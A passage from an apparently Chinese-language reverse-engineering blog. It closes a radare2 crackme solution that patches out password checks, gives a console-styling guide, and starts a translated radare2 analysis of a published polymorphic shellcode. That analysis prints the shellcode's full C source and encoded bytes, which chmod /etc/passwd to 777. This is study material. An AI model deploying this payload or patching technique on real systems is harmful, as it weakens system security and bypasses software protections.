|  |        ; JMP XREF from <span class="number">0x080486c5</span> (fcn<span class="number">.08048616</span>)
|- loc<span class="number">.080486e1</span> <span class="number">13</span>
|  `------&gt; <span class="number">0x080486e1</span>    <span class="number">8</span>d45f0       lea eax, [ebp-<span class="number">0x10</span>]
|   ||      <span class="number">0x080486e4</span>    ff00         inc dword [eax]
|   ||      <span class="number">0x080486e6</span>    ebcf         jmp loc<span class="number">.080486</span>b7
|   ||      ; JMP XREF from <span class="number">0x080486ae</span> (fcn<span class="number">.08048616</span>)
|   ||      ; JMP XREF from <span class="number">0x080486bb</span> (fcn<span class="number">.08048616</span>)
|- loc<span class="number">.080486e8</span> <span class="number">6</span>
|   ``----&gt; <span class="number">0x080486e8</span>    <span class="number">83</span>c424       add esp, <span class="number">0x24</span>
|           <span class="number">0x080486eb</span>    <span class="number">5</span>b           pop ebx
|           <span class="number">0x080486ec</span>    <span class="number">5</span>d           pop ebp
\           <span class="number">0x080486ed</span>    c3           ret
[<span class="number">0x08048420</span>]&gt; pdf@fcn<span class="number">.08048589</span>
           ; CALL XREF from <span class="number">0x08048689</span> (fcn<span class="number">.08048616</span>)
/ (fcn) fcn<span class="number">.08048589</span> <span class="number">141</span>
|          <span class="number">0x08048589</span>    <span class="number">55</span>           push ebp
|          <span class="number">0x0804858a</span>    <span class="number">89e5</span>         mov ebp, esp
|          <span class="number">0x0804858c</span>    <span class="number">53</span>           push ebx
|          <span class="number">0x0804858d</span>    <span class="number">83</span>ec14       sub esp, <span class="number">0x14</span>
|          <span class="number">0x08048590</span>    e8d1010000   call fcn<span class="number">.08048766</span>
|             fcn<span class="number">.08048766</span>(unk, unk)
|          <span class="number">0x08048595</span>    <span class="number">81</span>c35f1a0000 add ebx, <span class="number">0x1a5f</span>
|          <span class="number">0x0804859b</span>    <span class="number">8</span>d45f8       lea eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x0804859e</span>    <span class="number">89442408</span>     mov [esp+<span class="number">0x8</span>], eax
|          <span class="number">0x080485a2</span>    <span class="number">8</span>d835ee8ffff lea eax, [ebx-<span class="number">0x17a2</span>]
|          <span class="number">0x080485a8</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080485ac</span>    <span class="number">8</span>b4508       mov eax, [ebp+<span class="number">0x8</span>]
|          <span class="number">0x080485af</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x080485b2</span>    e839feffff   call sym.imp.<span class="built_in">sscanf</span>
|             sym.imp.<span class="built_in">sscanf</span>()
|          <span class="number">0x080485b7</span>    <span class="number">8</span>b450c       mov eax, [ebp+<span class="number">0xc</span>]
|          <span class="number">0x080485ba</span>    <span class="number">89442404</span>     mov [esp+<span class="number">0x4</span>], eax
|          <span class="number">0x080485be</span>    <span class="number">8</span>b45f8       mov eax, [ebp-<span class="number">0x8</span>]
|          <span class="number">0x080485c1</span>    <span class="number">890424</span>       mov [esp], eax
|          <span class="number">0x080485c4</span>    e80bffffff   call fcn<span class="number">.080484</span>d4
|             fcn<span class="number">.080484</span>d4() ; entry0+<span class="number">180</span>
|          <span class="number">0x080485c9</span>    <span class="number">85</span>c0         test eax, eax
|      ,=&lt; <span class="number">0x080485cb</span>    <span class="number">7443</span>         je loc<span class="number">.08048610</span>
|      |   <span class="number">0x080485cd</span>    c745f400000. mov dword [ebp-<span class="number">0xc</span>], <span class="number">0x0</span>
|      |   ; JMP XREF from <span class="number">0x0804860e</span> (fcn<span class="number">.0804855</span>d)
|- loc<span class="number">.080485</span>d4 <span class="number">66</span>
|      |   <span class="number">0x080485d4</span>    <span class="number">837</span>df409     cmp dword [ebp-<span class="number">0xc</span>], <span class="number">0x9</span>
|     ,==&lt; <span class="number">0x080485d8</span>    <span class="number">7f</span>36         jg loc<span class="number">.08048610</span>
|     ||   <span class="number">0x080485da</span>    <span class="number">8</span>b45f8       mov eax, [ebp-<span class="number">0x8</span>]
|     ||   <span class="number">0x080485dd</span>    <span class="number">83e001</span>       and eax, <span class="number">0x1</span>
|     ||   <span class="number">0x080485e0</span>    <span class="number">85</span>c0         test eax, eax
|    ,===&lt; <span class="number">0x080485e2</span>    <span class="number">7525</span>         jne loc<span class="number">.08048609</span>
|    |||   <span class="number">0x080485e4</span>    <span class="number">8</span>b83fcffffff mov eax, [ebx-<span class="number">0x4</span>]
|    |||   <span class="number">0x080485ea</span>    <span class="number">833801</span>       cmp dword [eax], <span class="number">0x1</span>
|   ,====&lt; <span class="number">0x080485ed</span>    <span class="number">750</span>e         jne loc<span class="number">.080485f</span>d
|   ||||   <span class="number">0x080485ef</span>    <span class="number">8</span>d8361e8ffff lea eax, [ebx-<span class="number">0x179f</span>]
|   ||||   <span class="number">0x080485f5</span>    <span class="number">890424</span>       mov [esp], eax
|   ||||   <span class="number">0x080485f8</span>    e8e3fdffff   call sym.imp.<span class="built_in">printf</span>
|   ||||      sym.imp.<span class="built_in">printf</span>()
|   |      ; JMP XREF from <span class="number">0x080485ed</span> (fcn<span class="number">.0804855</span>d)
|- loc<span class="number">.080485f</span>d <span class="number">25</span>
|   `----&gt; <span class="number">0x080485fd</span>    c7042400000. mov dword [esp], <span class="number">0x0</span>
|    |||   <span class="number">0x08048604</span>    e807feffff   call sym.imp.<span class="built_in">exit</span>
|    |||      sym.imp.<span class="built_in">exit</span>()
|    |     ; JMP XREF from <span class="number">0x080485e2</span> (fcn<span class="number">.0804855</span>d)
|- loc<span class="number">.08048609</span> <span class="number">13</span>
|    `---&gt; <span class="number">0x08048609</span>    <span class="number">8</span>d45f4       lea eax, [ebp-<span class="number">0xc</span>]
|     ||   <span class="number">0x0804860c</span>    ff00         inc dword [eax]
|     ||   <span class="number">0x0804860e</span>    ebc4         jmp loc<span class="number">.080485</span>d4
|     ||   ; JMP XREF from <span class="number">0x080485cb</span> (fcn<span class="number">.0804855</span>d)
|     ||   ; JMP XREF from <span class="number">0x080485d8</span> (fcn<span class="number">.0804855</span>d)
|- loc<span class="number">.08048610</span> <span class="number">6</span>
|     ``-&gt; <span class="number">0x08048610</span>    <span class="number">83</span>c414       add esp, <span class="number">0x14</span>
|          <span class="number">0x08048613</span>    <span class="number">5</span>b           pop ebx
|          <span class="number">0x08048614</span>    <span class="number">5</span>d           pop ebp
\          <span class="number">0x08048615</span>    c3           ret
[<span class="number">0x08048420</span>]&gt; s 
<span class="number">0x8048420</span>
[<span class="number">0x08048420</span>]&gt; s <span class="number">0x08048644</span>
[<span class="number">0x08048644</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x08048644</span>]&gt; s <span class="number">0x0804867a</span>
[<span class="number">0x0804867a</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804867a</span>]&gt; s <span class="number">0x080485cb</span>
[<span class="number">0x080485cb</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485cb</span>]&gt; s <span class="number">0x080485d8</span>
[<span class="number">0x080485d8</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485d8</span>]&gt; s <span class="number">0x080485e2</span>
[<span class="number">0x080485e2</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x080485e2</span>]&gt; s <span class="number">0x080485ed</span>
[<span class="number">0x080485ed</span>]&gt; wx <span class="number">9090</span>
[<span class="number">0x0804852d</span>]&gt; s <span class="number">0x080485c4</span>
[<span class="number">0x080485c4</span>]&gt; wx <span class="number">9090909090</span>
[<span class="number">0x080485c4</span>]&gt; q

 ~/Work/project/reverse/IOLI-crackme/bin-linux ⮀ ./crackme0x09
IOLI Crackme Level <span class="number">0x09</span>
Password: <span class="number">12345</span>
Password OK!
</code></pre><p>这不叫逆向……这叫把目标代码之外的东西都注释掉……</p>
<p>到此，忽然觉得吧，少了点东西。</p>
<ul>
<li>r2的动态调试功能</li>
<li>说好的reverse-engineer</li>
</ul>
<p>I find an interesting book: RE-for-beginers</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/uncategorized/2014/08/08/better-and-beautiful-console/" itemprop="url">
                  Better and Beautiful Console
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-08T00:00:00+08:00" content="2014-08-08">
              2014-08-08
            </time>
          </span>

          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/uncategorized/2014/08/08/better-and-beautiful-console/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="uncategorized/2014/08/08/better-and-beautiful-console/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>一般的linux控制台（这还是gentoo配置过的默认bash呢）是这样的</p>
<p><img src="/images/plainconsole.png" alt="普通控制台"></p>
<p>而经过一番简单的配置之后，你的控制台是这样的</p>
<p><img src="/images/fbterm.png" alt="fbterm"></p>
<hr>
<h2 id="如何美化Linux下控制台（Better_Framebuffer）">如何美化Linux下控制台（Better Framebuffer）</h2><p>如果你运气足够好，碰上个有良心的发行版会帮你稍微配置下bash，增加些显示当前目录啊、彩色输出啊的功能。如果你足够悲剧，选择了一个以KISS为目标的发行版或者碰到一个无良发行版，你的bash就是个勉强能用的悲剧。</p>
<p>为了让终端在即使没有X也能漂亮起来，为了更加愉快的在没有X的Server下工作，为了不装X胜似装X。让我们开始配置一个漂亮的Linux控制台吧。</p>
<p>我是在gentoo linux完成配置的，首先安装必要的程序：</p>
<pre><code>emerge fbterm fcitx-fbterm fbv fbdump zsh oh-<span class="keyword">my</span>-zsh gpm
</code></pre><h2 id="zsh">zsh</h2><p>1.把zsh改成默认shell</p>
<pre><code>chsh <span class="operator">-s</span> zsh
</code></pre><p>2.修改zsh主题</p>
<pre><code><span class="setting">ZSH_THEME=<span class="value"><span class="string">"agnoster"</span></span></span>
</code></pre><p>至此，zsh配置完成。</p>
<h2 id="fbterm背景图片">fbterm背景图片</h2><p>3.为了让fbterm显示背景图像，建立一个比如说<code>.background_fbterm</code>作为fbterm启动的封装</p>
<pre><code> ~ ⮀ cat .background_fbterm
<span class="shebang">#!/bin/bash</span>
<span class="comment"># fbterm-bi: a wrapper script to enable background image with fbterm</span>
<span class="comment"># usage: fbterm-bi /path/to/image fbterm-options</span>
<span class="built_in">echo</span> <span class="operator">-ne</span> <span class="string">"\e[?25l"</span> <span class="comment"># hide cursor</span>
fbv -ciuker <span class="string">"<span class="variable">$1</span>"</span> &lt;&lt; EOF
</code></pre><p>q<br>    EOF<br>    shift<br>    export FBTERM_BACKGROUND_IMAGE=1<br>    exec fbterm “$@”</p>
<ol>
<li><p>在<code>.zshrc</code>中添加一个别名，指定背景图片。</p>
<h1 id="fbterm">fbterm</h1><p> alias fbterm=”sh ~/.background_fbterm ~/Pictures/wallpaper/girl.png”</p>
</li>
</ol>
<h2 id="中文输入法">中文输入法</h2><ol>
<li><p>在<code>.fbtermrc</code>中写入以下行，提供framebuffer下的中文输入法。</p>
<h1 id="specify_the_favorite_input_method_program_to_run">specify the favorite input method program to run</h1><p> input-method=fcitx-fbterm</p>
<h2 id="鼠标支持">鼠标支持</h2></li>
</ol>
<p>你会迷恋上中键粘帖的。</p>
<hr>
<p>看到没有，简单5步，即使没有X，一个漂亮、高效、支持中文显示和输入的控制台就诞生了。</p>
<p>ps:关于终端截图。<code>fbgrab</code>获取的图像错位，</p>
<p>即使多次尝试w和h：</p>
<pre><code>cat /dev/fb0 &gt; fb<span class="class">.raw</span>
fbgrab -<span class="tag">i</span> -w <span class="number">1056</span> -h <span class="number">1024</span> -<span class="tag">b</span> <span class="number">32</span> -f framebuffer<span class="class">.raw</span> fb.png
</code></pre><p>获取的也是错位的图像。</p>
<p>后来编译个<code>fbdump</code>挺好用的。</p>
<pre><code><span class="tag">fbdump</span> &gt; <span class="tag">fb</span><span class="class">.ppm</span>
</code></pre><p>然后用gimp啊等转成其它格式就随意了</p>
<pre><code><span class="tag">gimp</span> <span class="tag">fb</span><span class="class">.ppm</span>
</code></pre>
            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/exploit/2014/08/07/radare2-shellcode/" itemprop="url">
                  Radare2小试: 简单shellcode分析(意译)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-08-07T00:00:00+08:00" content="2014-08-07">
              2014-08-07
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/exploit/" itemprop="url" rel="index">
                    <span itemprop="name">exploit</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/exploit/2014/08/07/radare2-shellcode/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2014/08/07/radare2-shellcode/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>意译自： <a href="http://canthack.org/2011/07/adventures-with-radare-1-a-simple-shellcode-analysis/" target="_blank" rel="external">Adventures with Radare2 #1: A Simple Shellcode Analysis</a></p>
<p>有个同学最近在学汇编。把我逆向的热情又拉起来了。下午看到个比较有意思又能看懂的文章，胡乱意译，可以当作我个人的一个笔记。有什么想法可以留言讨论。</p>
<p>以下是正文</p>
<hr>
<p><a href="http://radare.org/" target="_blank" rel="external">Radare2</a>——一个开源逆向工程工具箱，包含反汇编器、调试器和十六进制编辑器。本文将它嗯过逆向在<a href="http://www.projectshellcode.com" target="_blank" rel="external">Project Shellcode</a>上找到的shellcode来展示其基础用法。</p>
<h2 id="Shellcode">Shellcode</h2><p>我们先谈谈啥叫<code>Shellcode</code>，别想成shell脚本了。<code>shellcode</code>之用来挖掘漏洞的有效载荷。其中的典型就是注入一段启动shell的代码。</p>
<p>Project Shellcode是一个shellcode及其源码仓库。我通过<a href="http://reddit.com/r/reverseengineering" target="_blank" rel="external">reddit.com/r/reverseengineering</a>在上月找到的。让我们看看其中一个例子。</p>
<h2 id="60字节的chmod_777多态x86_Linux_Shellcode">60字节的chmod 777多态x86 Linux Shellcode</h2><p>我碰巧先看到<a href="http://www.projectshellcode.com/?q=node/289" target="_blank" rel="external">这个</a>.</p>
<pre><code>/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' <span class="command">\ </span>           __  /'__`<span class="command">\ </span>       /<span class="command">\ </span><span class="command">\_</span>_  /'__`<span class="command">\ </span>                  0
0  /<span class="command">\_</span>, <span class="command">\ </span>   ___   /<span class="command">\_</span><span class="command">\/</span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span>   ___<span class="command">\ </span><span class="command">\ </span>,_<span class="command">\/</span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span> _ ___           1
1  <span class="command">\/</span>_/<span class="command">\ </span><span class="command">\ </span>/' _ `<span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\/</span>_/_<span class="command">\_</span>&lt;_  /'___<span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\`</span>'__<span class="command">\ </span>         0
0     <span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span><span class="command">\ </span><span class="command">\_</span>_/<span class="command">\ </span><span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\/</span>           1
1      <span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\_</span><span class="command">\_</span><span class="command">\ </span><span class="command">\ </span><span class="command">\ </span><span class="command">\_</span>___/<span class="command">\ </span><span class="command">\_</span>___<span class="command">\\</span> <span class="command">\_</span>_<span class="command">\\</span> <span class="command">\_</span>___/<span class="command">\ </span><span class="command">\_</span><span class="command">\ </span>          0
0       <span class="command">\/</span>_/<span class="command">\/</span>_/<span class="command">\/</span>_/<span class="command">\ </span><span class="command">\_</span><span class="command">\ </span><span class="command">\/</span>___/  <span class="command">\/</span>____/ <span class="command">\/</span>__/ <span class="command">\/</span>___/  <span class="command">\/</span>_/           1
1                  <span class="command">\ </span><span class="command">\_</span>___/ &gt;&gt; Exploit database separated by exploit   0
0                   <span class="command">\/</span>___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  <span class="special">[</span>+<span class="special">]</span> Site            : Inj3ct0r.com                                  0
1  <span class="special">[</span>+<span class="special">]</span> Support e-mail  : submit<span class="special">[</span>at<span class="special">]</span>inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 60 bytes chmod 777 polymorphic x86 linux shellcode
Date   : Sat Jun  5 16:10:00 2010
Author : gunslinger_ 
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com),
ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
mywisdom (devilzc0de.org), loneferret (offensive-security.com)
*/

/*
root@localhost<span class="special">#</span> ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost<span class="special">#</span> gcc -o polymorphic_chmod polymorphic_chmod.c
chmod.c: In function ‘main’:
chmod.c:37: warning: incompatible implicit declaration of built-in function ‘strlen’
root@localhost<span class="special">#</span> ./polymorphic_chmod
Length: 64
root@localhost<span class="special">#</span> ls -la /etc/passwd
-rwxrwxrwx 1 root root 1869 2010-05-08 15:53 /etc/passwd
root@localhost<span class="special">#</span> chmod 644 /etc/passwd
root@localhost<span class="special">#</span> ls -la /etc/passwd
-rw-r--r-- 1 root root 1869 2010-05-08 15:53 /etc/passwd
*/

<span class="special">#</span>include &lt;stdio.h&gt;
<span class="special">#</span>include &lt;string.h&gt;

char shellcode<span class="special">[</span><span class="special">]</span> =
    "<span class="command">\xeb</span><span class="command">\x</span>11<span class="command">\x</span>5e<span class="command">\x</span>31<span class="command">\xc</span>9<span class="command">\xb</span>1<span class="command">\x</span>27<span class="command">\x</span>80<span class="command">\x</span>6c<span class="command">\x</span>0e<span class="command">\xff</span><span class="command">\x</span>35<span class="command">\x</span>80<span class="command">\xe</span>9<span class="command">\x</span>01"
    "<span class="command">\x</span>75<span class="command">\xf</span>6<span class="command">\xeb</span><span class="command">\x</span>05<span class="command">\xe</span>8<span class="command">\xea</span><span class="command">\xff</span><span class="command">\xff</span><span class="command">\xff</span><span class="command">\x</span>20<span class="command">\x</span>4a<span class="command">\x</span>66<span class="command">\xf</span>5<span class="command">\xe</span>5<span class="command">\x</span>44"
    "<span class="command">\x</span>90<span class="command">\x</span>66<span class="command">\xfe</span><span class="command">\x</span>9b<span class="command">\xee</span><span class="command">\x</span>34<span class="command">\x</span>36<span class="command">\x</span>02<span class="command">\xb</span>5<span class="command">\x</span>66<span class="command">\xf</span>5<span class="command">\xe</span>5<span class="command">\x</span>36<span class="command">\x</span>66<span class="command">\x</span>10"
    "<span class="command">\x</span>02<span class="command">\xb</span>5<span class="command">\x</span>1d<span class="command">\x</span>1b<span class="command">\x</span>34<span class="command">\x</span>34<span class="command">\x</span>34<span class="command">\x</span>64<span class="command">\x</span>9a<span class="command">\xa</span>9<span class="command">\x</span>98<span class="command">\x</span>64<span class="command">\xa</span>5<span class="command">\x</span>96<span class="command">\xa</span>8"
    "<span class="command">\xa</span>8<span class="command">\xac</span><span class="command">\x</span>99";

int main(void)
<span class="special">{</span>
    fprintf(stdout,"Length: <span class="comment">%zu\n",strlen(shellcode));</span>
    (*(void(*)()) shellcode)();

return 0;
<span class="special">}</span>
</code></pre><p>评论中的描述声称代码在<code>/etc/passwd</code>中设置文件权限为<code>777</code>，但是你乍一看肯定看不出来。我们只能看到一个初始化为16进制的字节数组。接着被投射给函数指针然后调用。</p>
<h2 id="实用Radare2分析">实用Radare2分析</h2><p>我们如何弄清程序做了什么？我们可以构建并且运行它，但我不会。因为它可能移除我的家目录。我们实用radare2静态检测它。</p>
<p>首先构建二进制文件</p>
<pre><code>~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/reverse ⮀ cc -o shellcode polymorphic_chmod_etc_passwd_777.c</span>
</code></pre><p>接着载入到radare2中：</p>
<pre><code> ~/Work/project/<span class="property">reverse</span> ⮀ r2 ./shellcode 
 <span class="comment">-- In soviet Afghanistan you debug radare2!</span>
[<span class="number">0x00400520</span>]&gt; 
</code></pre><p>我们没有加<code>-d</code>参数，这样可以以静态分析模式运行，而不是实用radare2内建的调试器。现在radare已经就绪，让我们开始输入命令。</p>
<p>radare2的命令通常都非常短。键入<code>?</code>回车就会进入帮助概述。若问号后面跟着命令，就会给出命令使用的详细信息。</p>
<p>我们首先得定位字节字符串。因为二进制文件没有被精简(stripped)，有幸保留了<code>main</code>函数的虚拟地址。Radare2使用<code>flags</code>的概念标记二进制文件中的有用位置。尝试键入<code>f</code>来得到标记列表。main函数将被标记为<code>sym.main</code>。</p>
<p>我们使用<code>pd</code>命令反汇编：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; pd@sym.main 
            <span class="comment">;-- sym.main:</span>
            <span class="number">0x0804849c</span>    <span class="number">55</span>           <span class="keyword">push</span> <span class="literal">ebp</span>                                     
            <span class="number">0x0804849d</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
            <span class="number">0x0804849f</span>    83e4f0       <span class="keyword">and</span> <span class="literal">esp</span>, <span class="number">0xfffffff0</span>
            <span class="number">0x080484a2</span>    83ec10       <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="number">0x10</span>
            <span class="number">0x080484a5</span>    c7042440a00. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], sym.shellcode <span class="comment">;  0x0804a040 </span>
            <span class="number">0x080484ac</span>    e8bffeffff   <span class="keyword">call</span> sym.imp.strlen
               <span class="number">0x08048370</span>(unk) <span class="comment">; sym.imp.strlen</span>
            <span class="number">0x080484b1</span>    8b1580a00408 <span class="keyword">mov</span> <span class="literal">edx</span>, [sym.__TMC_END__]
            <span class="number">0x080484b7</span>    <span class="number">89442408</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x8</span>], <span class="literal">eax</span>
</code></pre><p><code>pd</code>命令将反汇编等于<code>block size</code>的代码块(参见<code>b</code>命令)，本例中块大小似乎比main函数大很多。我们知道gcc生成结构非常好的函数，我们让radare2来分析这个函数并完整打印：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; af@sym.main 
[<span class="number">0x080483a0</span>]&gt; pdf@sym.main
           <span class="comment">; DATA XREF from 0x080483b7 (fcn.08048396)</span>
/ (fcn) sym.main <span class="number">61</span>
|          <span class="number">0x0804849c</span>    <span class="number">55</span>           <span class="keyword">push</span> <span class="literal">ebp</span>
|          <span class="number">0x0804849d</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
|          <span class="number">0x0804849f</span>    83e4f0       <span class="keyword">and</span> <span class="literal">esp</span>, <span class="number">0xfffffff0</span>
|          <span class="number">0x080484a2</span>    83ec10       <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="number">0x10</span>
|          <span class="number">0x080484a5</span>    c7042440a00. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>], sym.shellcode <span class="comment">;  0x0804a040 </span>
|          <span class="number">0x080484ac</span>    e8bffeffff   <span class="keyword">call</span> sym.imp.strlen
|             sym.imp.strlen(unk)
|          <span class="number">0x080484b1</span>    8b1580a00408 <span class="keyword">mov</span> <span class="literal">edx</span>, [sym.__TMC_END__]
|          <span class="number">0x080484b7</span>    <span class="number">89442408</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x8</span>], <span class="literal">eax</span>
|          <span class="number">0x080484bb</span>    c7442404708. <span class="keyword">mov</span> <span class="preprocessor">dword</span> [<span class="literal">esp</span>+<span class="number">0x4</span>], <span class="keyword">str</span>.Length___zu_n <span class="comment">;  0x08048570 </span>
|          <span class="number">0x080484c3</span>    <span class="number">891424</span>       <span class="keyword">mov</span> [<span class="literal">esp</span>], <span class="literal">edx</span>
|          <span class="number">0x080484c6</span>    e8c5feffff   <span class="keyword">call</span> sym.imp.fprintf
|             sym.imp.fprintf()
|          <span class="number">0x080484cb</span>    b840a00408   <span class="keyword">mov</span> <span class="literal">eax</span>, sym.shellcode <span class="comment">;  0x0804a040 </span>
|          <span class="number">0x080484d0</span>    ffd0         <span class="keyword">call</span> <span class="literal">eax</span>
|             <span class="number">0x00000000</span>() <span class="comment">; section..comment</span>
|          <span class="number">0x080484d2</span>    b800000000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x0</span>
|          <span class="number">0x080484d7</span>    c9           <span class="keyword">leave</span>
\          <span class="number">0x080484d8</span>    c3           <span class="keyword">ret</span>
</code></pre><p>打眼一看就知道需要什么知道什么了。在二进制文件中有足够的信息来帮助标记挖掘漏洞的shellcode字符串位置。你可以在符号名后头看到实际地址。</p>
<p>这个程序对载荷做了什么？可以看到<code>strlen()</code>和<code>fprintf()</code><br>的调用。但更重要的，shellcode的地址在被调用前载入eax寄存器(在<code>0x080484cb</code>载入，于<code>0x080484d0</code>调用)。显然下一步就是检查有效载荷看看它做了什么：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; pD <span class="number">60</span>@sym.shellcode
|      ,  <span class="comment">; DATA XREF from 0x080484a2 (sym.main)</span>
|      ,  <span class="comment">; DATA XREF from 0x080484c8 (sym.main)</span>
       ,  <span class="comment">;-- sym.shellcode:</span>
       ,=&lt; <span class="number">0x0804a040</span>    eb11         <span class="keyword">jmp</span> <span class="number">0x804a053</span>
       |   <span class="comment">;-- str._1___:</span>
       |   <span class="number">0x0804a042</span>     <span class="string">.string</span> <span class="string">"^1ɱ'"</span> <span class="comment">; len=6</span>
      ||   <span class="number">0x0804a048</span>    6c           <span class="keyword">insb</span>
      ||   <span class="number">0x0804a049</span>    0e           <span class="keyword">push</span> <span class="literal">cs</span>
      ||   <span class="number">0x0804a04a</span>    ff3580e90175 <span class="keyword">push</span> <span class="preprocessor">dword</span> [<span class="number">0x7501e980</span>]
       |   <span class="number">0x0804a050</span>    f6eb         <span class="keyword">imul</span> <span class="literal">bl</span>
     | |   <span class="number">0x0804a052</span>    05e8eaffff   <span class="keyword">add</span> <span class="literal">eax</span>, <span class="number">0xffffeae8</span>
     |     <span class="number">0x0804a057</span>    ff20         <span class="keyword">jmp</span> <span class="preprocessor">dword</span> [<span class="literal">eax</span>]
           <span class="number">0x0804a059</span>    4a           <span class="keyword">dec</span> <span class="literal">edx</span>
           <span class="number">0x0804a05a</span>    66f5         o16 <span class="keyword">cmc</span>
           <span class="number">0x0804a05c</span>    e544         <span class="keyword">in</span> <span class="literal">eax</span>, <span class="number">0x44</span>
           <span class="number">0x0804a05e</span>    <span class="number">90</span>           <span class="keyword">nop</span>
           <span class="number">0x0804a05f</span>    66fe9b       invalid
           <span class="number">0x0804a062</span>    ee           <span class="keyword">out</span> <span class="literal">dx</span>, <span class="literal">al</span>
           <span class="number">0x0804a063</span>    <span class="number">3436</span>         <span class="keyword">xor</span> <span class="literal">al</span>, <span class="number">0x36</span>
           <span class="number">0x0804a065</span>    02b566f5e536 <span class="keyword">add</span> <span class="number">dh</span>, [<span class="literal">ebp</span>+<span class="number">0x36e5f566</span>]
           <span class="number">0x0804a06b</span>    <span class="number">661002</span>       o16 <span class="keyword">adc</span> [<span class="literal">edx</span>], <span class="literal">al</span>
           <span class="number">0x0804a06e</span>    b51d         <span class="keyword">mov</span> <span class="number">ch</span>, <span class="number">0x1d</span> <span class="comment">;  0x0000001d </span>
           <span class="comment">;-- str._e444d:</span>
           <span class="number">0x0804a070</span>     <span class="string">.string</span> <span class="string">"\\e444d"</span> <span class="comment">; len=6</span>
           <span class="number">0x0804a076</span>    a99864a596   <span class="keyword">test</span> <span class="literal">eax</span>, <span class="number">0x96a56498</span>
           <span class="number">0x0804a07b</span>    a8           invalid
</code></pre><p>这里使用<code>pD</code>来指定想要反汇编的字节数(这里是60)。该怎么评论这些呢？乍一看，有些不能执行的东西，有点棘手。</p>
<p>译者：我的radare git-2014-7-26版本显然和2011年作者写这篇文章时变化了很多。为了能够继续下去，使用<code>pDi</code>命令：</p>
<pre><code>[<span class="number">0x080483a0</span>]&gt; pDi <span class="number">60</span>@sym.shellcode
